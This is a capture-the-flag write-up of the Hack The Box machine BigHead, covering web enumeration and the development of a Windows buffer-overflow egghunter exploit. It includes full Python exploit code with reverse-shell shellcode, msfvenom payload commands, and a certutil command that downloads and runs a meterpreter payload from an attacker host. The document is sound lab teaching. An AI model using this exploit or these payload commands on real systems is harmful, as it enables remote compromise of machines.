---
layout: post
title: Hack The Box - BigHead
categories: hack-the-box
tags: [Windows, Web, Reverse Engineering, egghunting, Buffer Overflow, Windows Exploitation, Exploit Development, LFI, RCE, Forensics, Networking, Pivoting, ssh, code analysis, Python, php]
image: /hackthebox/bighead/0.png
---
<hr>
### Quick Summary
#### Hey guys, Today BigHead retired and here's my write-up about it. As you can see it's an insane box, actually it's hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn't bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of [Silicon Valley](https://www.imdb.com/title/tt2575988/) references :D even the name of the box is the name of one of the characters, Anyway let's not waste more time. It's a windows box and its ip is `10.10.10.112`. I added it to `/etc/hosts` as `bighead.htb`. Let's jump right in !
![](/images/hackthebox/bighead/0.png)
<hr>
### Nmap
#### As always we will start with nmap to scan for open ports and services :
`nmap -sV -sT -sC bighead.htb`
![](/images/hackthebox/bighead/1.png)
#### Only one port is open which is port 80 and it's running http. Let's take a look.
<br>
<hr>
### HTTP Enumeration 
![](/images/hackthebox/bighead/2.png)
#### It's a website titled `PiperNet Comes`. The background is an image of the characters from the TV show "Silicon Valley", and in the middle it's saying `PIPERNET IS HERE`. Also there are two links down there, First one is `THIS IS PIPERNET` which is the homepage and the other one is `PIEDPIPERCOIN`. Let's scroll down and see what else do we have :
![](/images/hackthebox/bighead/3.png)
#### `PIEDPIPERCOIN COMES`, and there's a small description of what piedpipercoin is. 
![](/images/hackthebox/bighead/4.png)
<br>
<br>
![](/images/hackthebox/bighead/5.png)
<br>
<br>
![](/images/hackthebox/bighead/6.png)
#### After that there are some pictures for the characters from "Silicon Valley" and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form :
![](/images/hackthebox/bighead/7.png)
#### I looked at the contact info and I noticed that the email was `info@bachmanity.htb`. Let's check that domain, but before doing that I wanted to check the other page `PIEDPIPERCOIN` :
![](/images/hackthebox/bighead/8.png)
#### Instead of `PIEDPIPERCOIN COMES` it's saying `PIEDPIPERCOIN CAME` but nothing is interesting. Let's check `bachmanity.htb`, we need to add it to `/etc/hosts` first :
![](/images/hackthebox/bighead/9.png)
<br>
<br>
`bachmanity.htb`
![](/images/hackthebox/bighead/10.png)
#### It's only that image and nothing else :
![](/images/hackthebox/bighead/11.png)
#### Back to the contact form, I wanted to see if it's exploitable in any way. I filled all the fields with `test` :
![](/images/hackthebox/bighead/12.png)
<br>
<br>
![](/images/hackthebox/bighead/13.png)
#### It sends the request to `mailer.bighead.htb`, Let's add it to `/etc/hosts` and try again :
![](/images/hackthebox/bighead/14.png)
<br>
<br>
![](/images/hackthebox/bighead/15.png)
#### It shows this message then it redirects the browser back to `bighead.htb`. I also intercepted the request with burp :
![](/images/hackthebox/bighead/16.png)
<br>
<br>
![](/images/hackthebox/bighead/17.png)
#### Tried to manipulate the input, but couldn't achieve anything. I went to `mailer.bighead.htb` and got redirected to `mailer.bighead.htb/testlink` which shows this error :
![](/images/hackthebox/bighead/18.png)
<br>
<br>
![](/images/hackthebox/bighead/19.png)
#### In the background I ran `gobuster` on `bachmanity.htb`  and `bighead.htb` with `/usr/share/wordlists/dirb/common.txt`. `bachmanity.htb` didn't have anything :
```
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bachmanity.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:21:01 Starting gobuster
=====================================================
/index.html (Status: 200)
/index.htm (Status: 200)
```
#### but `bighead.htb` gave some results :
```
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:16:23 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/backend (Status: 302)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
```
#### I went to `/assets` and it was forbidden :
![](/images/hackthebox/bighead/20.png)
#### `/backend` redirected the browser to `bighead.htb/BigHead` which gave the same error we saw before :
![](/images/hackthebox/bighead/21.png)
<br>
<br>
![](/images/hackthebox/bighead/22.png)
#### I clicked on `error log` and it gave the same error :
![](/images/hackthebox/bighead/23.png)
#### Let's check if there are any other subdomains. I used `wfuzz` with [subdomains-top1mil-5000.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1mil-5000.txt) from [seclists](https://github.com/danielmiessler/SecLists):
`wfuzz -c -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112`
![](/images/hackthebox/bighead/24.png)
#### non-valid subdomain responses are `11232` chars so we will remove those from the output :
`wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H "HOST: FUZZ.bighead.htb" http://10.10.10.112`
![](/images/hackthebox/bighead/25.png)
#### We got 3 subdomains : `dev`, `mailer` and `code`. We already know about `mailer`, let's add `dev` and `code` :
![](/images/hackthebox/bighead/26.png)
#### `code.bighead.htb` redirected the browser to `127.0.0.1:5080/testlink/login.php`
![](/images/hackthebox/bighead/27.png)
<br>
<br>
![](/images/hackthebox/bighead/28.png)
#### So to see what's on `code.bighead.htb` we will probably need to forward an internal service to our box. We can't do that now so we will ignore `code.bighead.htb` for now.
#### `dev.bighead.htb` shows this image of bighead :
![](/images/hackthebox/bighead/29.png)
#### Source has nothing interesting :
![](/images/hackthebox/bighead/30.png)
#### I ran `gobuster` again and got some results :
```
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://dev.bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:55:05 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/blog (Status: 302)
/blog_ajax (Status: 302)
/blog_inlinemod (Status: 302)
/blog_usercp (Status: 302)
/blog_search (Status: 302)
/blog_report (Status: 302)
/blogger (Status: 302)
/blogindex (Status: 302)
/bloggers (Status: 302)
/blogs (Status: 302)
/blogspot (Status: 302)
/wp-content (Status: 302)
```
#### But all these pages gave this result :
![](/images/hackthebox/bighead/31.png)
#### I intercepted the request in burp to figure out why :
![](/images/hackthebox/bighead/32.png)
<br>
<br>
![](/images/hackthebox/bighead/33.png)
#### The response is `302`, by following the redirect :
![](/images/hackthebox/bighead/34.png)
#### It responds with another `302`
![](/images/hackthebox/bighead/35.png)
#### So it will keep redirecting us in a loop and we won't get anything.
#### At this point I didn't know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with `wfuzz` instead of `gobuster` and I got one more result :
`wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ`
![](/images/hackthebox/bighead/36.png)
#### The reason why `gobuster` didn't show us this page is because of the status code. `gobuster` only showed results with these status codes : `[+] Status codes : 200,204,301,302,307,403`, While `wfuzz` showed everything except `404` responses, `--hc 404`. `/coffee` gave a response of `418` which is weird. I looked it up and found some info about it [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418). `418 I'm a teapot` ! Anyway let's take a look :
`http://dev.bighead.htb/coffee`
![](/images/hackthebox/bighead/37.png)
#### It's showing this `gif` :
![](/images/hackthebox/bighead/teapot.gif)
#### Which is saying : "The requested entity body is short and stout. Tip me over and pour me out." ?!
#### I intercepted the request with burp and looked at the response :
![](/images/hackthebox/bighead/38.png)
<br>
<br>
![](/images/hackthebox/bighead/39.png)
#### I noticed a weird server name : `BigheadWebSvr 1.0`. I looked it up and found a repository on the machine creator's github (3mrgnc3) :
![](/images/hackthebox/bighead/40.png)
#### I searched through the commits and got [this one](https://github.com/3mrgnc3/BigheadWebSvr/blob/b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d/BHWS_Backup.zip) which seemed to be the right one.
![](/images/hackthebox/bighead/41.png)
#### It asked for a password :
![](/images/hackthebox/bighead/42.png)
#### I tried to guess it and after some attempts `bighead` worked :
![](/images/hackthebox/bighead/43.png)
<br>
<br>
![](/images/hackthebox/bighead/44.png)
<br>
<br>
![](/images/hackthebox/bighead/45.png)
#### Of course it's a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : "The requested entity body is short and stout. Tip me over and pour me out.", This server is probably vulnerable to a buffer overflow.
<br>
<hr>
### Buffer Overflow in `BigheadWebSvr`
#### I tried to run the server but it complained about some missing `dll` called `libmingwex-0.dll` :
![](/images/hackthebox/bighead/46.png)
####  So I installed [mingw](https://osdn.net/projects/mingw/releases/) and copied the `dll` to the same directory as the server :
![](/images/hackthebox/bighead/47.png)
#### Then I had to allow access for it :
![](/images/hackthebox/bighead/48.png)
#### Now the server is running :
![](/images/hackthebox/bighead/49.png)
#### But not on port 80 :
![](/images/hackthebox/bighead/50.png)
#### I did `netstat -a -b` and found that it's running on port 8008 :
![](/images/hackthebox/bighead/51.png)
<br>
<br>
![](/images/hackthebox/bighead/52.png)
<br>
<br>
![](/images/hackthebox/bighead/53.png)
#### Great, I intercepted the request with burp then I ran the server again with [Immunity Debugger](https://www.immunityinc.com/products/debugger/) :
![](/images/hackthebox/bighead/54.png)
<br>
<br>
![](/images/hackthebox/bighead/55.png)
#### Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know ... the machine name is BigHead :D
![](/images/hackthebox/bighead/56.png)
<br>
<br>
![](/images/hackthebox/bighead/57.png)
#### And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn't crash, and that was a bit of a problem because we are limited to a specific size so we don't have enough space to store our shellcode, That's why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don't know. When we don't have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what's after it (the shellcode). The egg is a 4-bytes string, say for example `R1ck` that egg is doubled and added before the shellcode like this : `R1ckR1ck + shellcode`. It's explained very well in skape's paper [Safely Searching Process Virtual Address Space](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf). There are also many practical tutorials just search for win32 egghunting. 
#### Now back to the vulnerable server, first thing we need to know is the offset. I'm using [mona plugin](https://github.com/corelan/mona). [Documentation](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
#### `!mona config -set workingfolder c:\logs\%p`, to make `mona` output to `C:\logs`
![](/images/hackthebox/bighead/58.png)
#### To find the offset we will create a pattern `!mona pc 100` (creates a pattern of 100 chars), this is the same as `pattern_create.rb` from `metasploit`. I used it in my [buffer overflow write-ups](/categories/#binary-exploitation).
![](/images/hackthebox/bighead/59.png)
#### It will put the output in a file called `pattern.txt` in `C:\logs` :
![](/images/hackthebox/bighead/60.png)
#### Pattern : `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`
![](/images/hackthebox/bighead/61.png)
#### Full output :
```
================================================================================
  Output generated by mona.py v2.0, rev 585 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  Process being debugged : BigheadWebSvr (pid 1300)
  Current mona arguments: pc 100
================================================================================
  2019-04-24 22:43:44
================================================================================

Pattern of 100 bytes :
----------------------

ASCII:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

HEX:
\x41\x61\x30\x41\x61\x31\x41\x61\x32\x41\x61\x33\x41\x61\x34\x41\x61\x35\x41\x61\x36\x41\x61\x37\x41\x61\x38\x41\x61\x39\x41\x62\x30\x41\x62\x31\x41\x62\x32\x41\x62\x33\x41\x62\x34\x41\x62\x35\x41\x62\x36\x41\x62\x37\x41\x62\x38\x41\x62\x39\x41\x63\x30\x41\x63\x31\x41\x63\x32\x41\x63\x33\x41\x63\x34\x41\x63\x35\x41\x63\x36\x41\x63\x37\x41\x63\x38\x41\x63\x39\x41\x64\x30\x41\x64\x31\x41\x64\x32\x41


JAVASCRIPT (unescape() friendly):
%u6141%u4130%u3161%u6141%u4132%u3361%u6141%u4134%u3561%u6141%u4136%u3761%u6141%u4138%u3961%u6241%u4130%u3162%u6241%u4132%u3362%u6241%u4134%u3562%u6241%u4136%u3762%u6241%u4138%u3962%u6341%u4130%u3163%u6341%u4132%u3363%u6341%u4134%u3563%u6341%u4136%u3763%u6341%u4138%u3963%u6441%u4130%u3164%u6441%u4132
```
#### Let's send the pattern :
![](/images/hackthebox/bighead/62.png)
<br>
<br>
![](/images/hackthebox/bighead/63.png)
#### the EIP was overwritten with `ACC54AAC`, `!mona findmsp` should give us the offset but for some reason it wasn't able to find it so I did it manually. We will reverse `ACC54AAC` because it's [little endian](http://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html), so it will be `AC4AC5AC`. I located it then I used python's function `len()` to find the length of the string before `AC4AC5AC` :
![](/images/hackthebox/bighead/64.png)
<br>
<br>
![](/images/hackthebox/bighead/65.png)
#### Offset is 72, let's confirm that. I sent 72 A's then 8 B's :
![](/images/hackthebox/bighead/66.png)
#### And I could successfully overwrite EIP with B : 
![](/images/hackthebox/bighead/67.png)
#### Nice, We control EIP, Now we need to find a real address to overwrite EIP with. Since the egghunter will be located on the stack we need to find a `jmp esp` instruction to make it jmp to the egghunter and execute it. To do this we will use mona. `!mona jmp -r ESP`. It will create another file in `C:\logs` called `jmp.txt`. We need to make sure that the address we choose will work on the target machine, So I used one of the addresses from the `dll` of the server itself `bHeadSvr.dll`. I chose the first one :
![](/images/hackthebox/bighead/68.png)
<br>
<br>
![](/images/hackthebox/bighead/69.png)
#### Full Output :
```
================================================================================
  Output generated by mona.py v2.0, rev 585 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  Process being debugged : BigheadWebSvr (pid 5532)
  Current mona arguments: jmp -r ESP
================================================================================
  2019-04-25 02:15:27
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x74c70000 | 0x74e61000 | 0x001f1000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll)
 0x771f0000 | 0x77269000 | 0x00079000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [sechost.dll] (C:\Windows\System32\sechost.dll)
 0x00400000 | 0x00413000 | 0x00013000 | False  | False   | False |  False   | False  | -1.0- [BigheadWebSvr.exe] (C:\bighead\BHWS_Backup\BigheadWebSvr.exe)
 0x62500000 | 0x62510000 | 0x00010000 | False  | False   | False |  False   | False  | -1.0- [bHeadSvr.dll] (C:\bighead\BHWS_Backup\bHeadSvr.dll)
 0x75510000 | 0x755a8000 | 0x00098000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)
 0x74ef0000 | 0x74fb0000 | 0x000c0000 | True   | True    | True  |  False   | True   | 7.0.17763.1 [msvcrt.dll] (C:\Windows\System32\msvcrt.dll)
 0x64540000 | 0x64570000 | 0x00030000 | False  | False   | False |  False   | False  | -1.0- [libmingwex-0.dll] (C:\bighead\BHWS_Backup\libmingwex-0.dll)
 0x75270000 | 0x752ee000 | 0x0007e000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [ADVAPI32.DLL] (C:\Windows\System32\ADVAPI32.DLL)
 0x776b0000 | 0x77847000 | 0x00197000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x77410000 | 0x774cf000 | 0x000bf000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll)
 0x75370000 | 0x753cf000 | 0x0005f000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [WS2_32.dll] (C:\Windows\System32\WS2_32.dll)
-----------------------------------------------------------------------------------------------------------------------------------------
0x625012f0 : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x625012fd : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250130a : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501317 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501324 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501331 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250133e : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250134b : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250134d : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6455b1ca : push esp # ret  |  {PAGE_EXECUTE_READ} [libmingwex-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\libmingwex-0.dll)
```
#### Let's send a request to test it, 72 A's then `f0125062` which is `625012f0` reversed:
![](/images/hackthebox/bighead/70.png)
<br>
<br>
![](/images/hackthebox/bighead/71.png)
#### It's working fine. Last thing we need to know is how to send the shellcode. I sent a POST request to see how the server handles it, just a bunch of A's :
![](/images/hackthebox/bighead/72.png)
#### Then I searched in the memory :
![](/images/hackthebox/bighead/73.png)
<br>
<br>
![](/images/hackthebox/bighead/74.png)
<br>
<br>
![](/images/hackthebox/bighead/75.png)
#### As we can see the whole request is printed in the memory. With this information now we can write the exploit.
<br>
<hr>
### Writing the Exploit
#### First thing is the imports, I imported `socket`,`binascii` and `re` 
```
import socket
import binascii
import re
```
#### Then I started to define the variables , we need variables to hold the host, the port, the egg, the shellcode and the egghunter. Let's generate the shellcode first :
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -b '\x00' -f python`
![](/images/hackthebox/bighead/76.png)
#### `-b '\x00'` is for bad chars. `\x00` which is a null byte is always a bad char because it acts a string terminator and terminates the execution so we don't need that in the shellcode.  We will add this to the exploit and remove `\x` because we will use `hexlify` and `unhexlify` functions from `binascii`. This is for the shellcode, now we need the egghunter. I used this [tool](https://github.com/ihack4falafel/OSCE/blob/master/Tools/EggHunter.py) to generate the egghunter :
![](/images/hackthebox/bighead/77.png)
#### But I didn't like that I should generate a new one if I wanted to change the egg, here's how the tool is doing it :
![](/images/hackthebox/bighead/78.png)
#### We can easily add this to the exploit itself. 
```
host = '10.10.10.112'
port = 80
egg = 'R1ck'
```
#### `host` is for the ip of the machine, `port` is for the port and `egg` is to hold the value of the egg. After that comes the `buf` variable generated by `msfvenom` (this is the my shellcode you should generate a new one with your ip and listening port) :
```
buf =  ""
buf += "d9c7d97424f45a2bc9bb9f0948"
buf += "3bb15283c204315a1303c51aaa"
buf += "ce05f4a831f505cdb81034cddf"
buf += "5167fd94378476f8a31ffad5c4"
buf += "a8b103eb29e9706aaaf0a44c93"
buf += "3ab98dd42730df8d2ce7cfba79"
buf += "3464f06c3c99418e6d0cd9c9ad"
buf += "af0e62e4b7534fbe4ca73b4184"
buf += "f9c4eee93537ee2ef1a8854601"
buf += "549e9d7b822b05db418be1dd86"
buf += "4a62d163182cf672cd4702fef0"
buf += "878244d703ce1f7612aace8744"
buf += "15ae2d0fb8bb5f52d508526c25"
buf += "07e51f17885db71b4178405b78"
buf += "3cdea2833df760d76d6f4058e6"
buf += "6f6d8da93fc17e0aefa12ee2e5"
buf += "2d101206e439b9fd6f4c34ee74"
buf += "384a108e81c3f6fae185a19298"
buf += "8f3902641a4404eea9b9cb07c7"
buf += "a9bce792936bf708bbf06ad73b"
buf += "7e97406cd76999f8c5d0331e14"
buf += "847c9ac375822381c2a0335fca"
buf += "ec670f9dbad1e9770d8ba324c7"
buf += "5b3507d81d3a42aec18b3bf7fe"
buf += "24acff87584cff52d97c4afe48"
buf += "15136bc978a4460e852762ef72"
buf += "3707ea3ffff486506afa3550bf"

```
#### I created a variable to hold the final shellcode (egg doubled + shellcode) and another variable for the egghunter :
```
shellcode = (egg * 2) + binascii.unhexlify(buf)
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + binascii.hexlify(egg) + "8bfaaf75eaaf75e7ffe7"
```
![](/images/hackthebox/bighead/79.png)
#### Note : there's a variable called `N`, that will come later and it has nothing to do with the exploit itself.
#### Now we need to create two functions. First one is to send the shellcode through a POST request, The other one is to exploit the vulnerability and send the egghunter. 
#### We will start by defining the function :
`def send_shellcode(N,host,port,egg,shellcode):`
#### Then we will open a TCP stream socket to the server and the port and hold it in a variable called `s` :
`s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)`
#### Last thing to do is to send the POST request with the shellcode :
```
s.send("POST / HTTP/1.1\r\n")
s.send("Host: dev.bighead.htb\r\n")
s.send("Content-Length: %s\r\n"%len(shellcode))
s.send("\r\n")
s.send(shellcode+"\r\n")
s.send("\r\n")
```
#### Then we will close the stream :
`s.close()`
#### I added this in a `for` loop to send the shellcode 16 times. I did this because I wanted to put the shellcode in different places so the egghunter finds it easily. I also added a print statement at the start of the function : `print "\033[32m [*] Sending Shellcode"`, `\033[32m` is for the color it's not important for the exploit. And I added a print statement before closing the stream : `print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))`. `re.sub(r"\s"," ",s.recv(12))` This will use `re` (regular expressions operations) to print the first 12 chars of the first line of the server response ("HTTP/1.1" + " " + status code (3 chars) = 12).
`send_shellcode` :
```
def send_shellcode(N,host,port,egg,shellcode):
	print "\033[32m [*] Sending Shellcode"
	for i in range(0,16):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		s.connect((host,port))
		s.send("POST / HTTP/1.1\r\n")
		s.send("Host: dev.bighead.htb\r\n")
		s.send("Content-Length: %s\r\n"%len(shellcode))
		s.send("\r\n")
		s.send(shellcode+"\r\n")
		s.send("\r\n")
		print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))
		s.close()
		N += 1
	print "\033[32m [*] Done"
```
![](/images/hackthebox/bighead/80.png)
#### That's for `send_shellcode`, let's write `send_egghunter`. We will define the function first :
`def send_egghunter(host,port,egghunter):`
#### Then we will open a TCP stream socket to the server and the port and hold it in a variable called `s` :
`s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)`
#### Then we will connect and send the HEAD request :
```
s.connect((host,port))
s.settimeout(None)
s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
s.send("Host: dev.bighead.htb\r\n")
s.send("\r\n")
```
#### I did `settimeout(None)` as the server takes a lot of time to respond to this request (Because we will change the code flow so the server won't reply) and we don't want the stream to be closed before our egghunter is successfully executed.
#### `s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")` This line sends 72 A's then `f0125062` (jmp esp (new EIP)) then the egghunter. 
`send_egghunter` :
```
def send_egghunter(host,port,egghunter):
	print "\033[32m [*] Sending EggHunter"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	s.connect((host,port))
	s.settimeout(None)
	s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
	s.send("Host: dev.bighead.htb\r\n")
	s.send("\r\n")
	print '\033[34m' + re.sub(r"\s"," ",s.recv(12))
	s.close()
	print "\033[32m [*] Done"
```
![](/images/hackthebox/bighead/81.png)
#### The exploit is ready, we just need to call the functions :
```
send_shellcode(N,host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
```
![](/images/hackthebox/bighead/82.png)
#### Final Exploit :
```
#!/usr/bin/python
import socket
import binascii
import re

host = '10.10.10.112'
port = 80
egg = 'R1ck'

N = 0

buf =  ""
buf += "d9c7d97424f45a2bc9bb9f0948"
buf += "3bb15283c204315a1303c51aaa"
buf += "ce05f4a831f505cdb81034cddf"
buf += "5167fd94378476f8a31ffad5c4"
buf += "a8b103eb29e9706aaaf0a44c93"
buf += "3ab98dd42730df8d2ce7cfba79"
buf += "3464f06c3c99418e6d0cd9c9ad"
buf += "af0e62e4b7534fbe4ca73b4184"
buf += "f9c4eee93537ee2ef1a8854601"
buf += "549e9d7b822b05db418be1dd86"
buf += "4a62d163182cf672cd4702fef0"
buf += "878244d703ce1f7612aace8744"
buf += "15ae2d0fb8bb5f52d508526c25"
buf += "07e51f17885db71b4178405b78"
buf += "3cdea2833df760d76d6f4058e6"
buf += "6f6d8da93fc17e0aefa12ee2e5"
buf += "2d101206e439b9fd6f4c34ee74"
buf += "384a108e81c3f6fae185a19298"
buf += "8f3902641a4404eea9b9cb07c7"
buf += "a9bce792936bf708bbf06ad73b"
buf += "7e97406cd76999f8c5d0331e14"
buf += "847c9ac375822381c2a0335fca"
buf += "ec670f9dbad1e9770d8ba324c7"
buf += "5b3507d81d3a42aec18b3bf7fe"
buf += "24acff87584cff52d97c4afe48"
buf += "15136bc978a4460e852762ef72"
buf += "3707ea3ffff486506afa3550bf"

shellcode = (egg * 2) + binascii.unhexlify(buf)
egghunter = "6681caff0f42526a0258cd2e3c055a74efb8" + binascii.hexlify(egg) + "8bfaaf75eaaf75e7ffe7"

def send_shellcode(N,host,port,egg,shellcode):
	print "\033[32m [*] Sending Shellcode"
	for i in range(0,16):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
		s.connect((host,port))
		s.send("POST / HTTP/1.1\r\n")
		s.send("Host: dev.bighead.htb\r\n")
		s.send("Content-Length: %s\r\n"%len(shellcode))
		s.send("\r\n")
		s.send(shellcode+"\r\n")
		s.send("\r\n")
		print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))
		s.close()
		N += 1
	print "\033[32m [*] Done"

def send_egghunter(host,port,egghunter):
	print "\033[32m [*] Sending EggHunter"
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)
	s.connect((host,port))
	s.settimeout(None)
	s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")
	s.send("Host: dev.bighead.htb\r\n")
	s.send("\r\n")
	print '\033[34m' + re.sub(r"\s"," ",s.recv(12))
	s.close()
	print "\033[32m [*] Done"

send_shellcode(N,host,port,egg,shellcode)
send_egghunter(host,port,egghunter)
```
#### Now it's show time, Let's test the exploit :
![](/images/hackthebox/bighead/83.png)
#### Perfectly working ! we got a reverse shell.
<br>
<hr>
### Enumeration, Enumeration, Enumeration ...
![](/images/hackthebox/bighead/84.png)
#### We are on the machine as `nelson`, There is another user on the box called `nginx` :
![](/images/hackthebox/bighead/85.png)
#### I checked `C:\Users\Nelson` and `C:\Users\Nelson\Desktop` and I found the user flag :
![](/images/hackthebox/bighead/86.png)
<br>
<br>
![](/images/hackthebox/bighead/87.png)
#### 2962 bytes? Well ... no it's not the user flag :
![](/images/hackthebox/bighead/88.png)
#### So we probably we need to be `nginx` to get the user flag. And of course we can't access `nginx` directory :
![](/images/hackthebox/bighead/89.png)
#### I wanted to upgrade that reverse shell into `meterpreter` so I had to create the payload first :
`msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1338 -f exe > m.exe`
![](/images/hackthebox/bighead/90.png)
#### Then I set up the `meterpreter` handler :
![](/images/hackthebox/bighead/91.png)
#### I ran a python simple http server on port 80 : `python -m SimpleHTTPServer 80` to host the payload. Then I went to `C:\Users\Nelson\AppData\Local\Temp` and downloaded the payload with `certutil` :
`certutil -urlcache -split -f http://10.10.xx.xx/m.exe m.exe`
![](/images/hackthebox/bighead/92.png)
#### Then I executed it and got a `meterpreter` session :
![](/images/hackthebox/bighead/93.png)
<br>
<br>
![](/images/hackthebox/bighead/94.png)
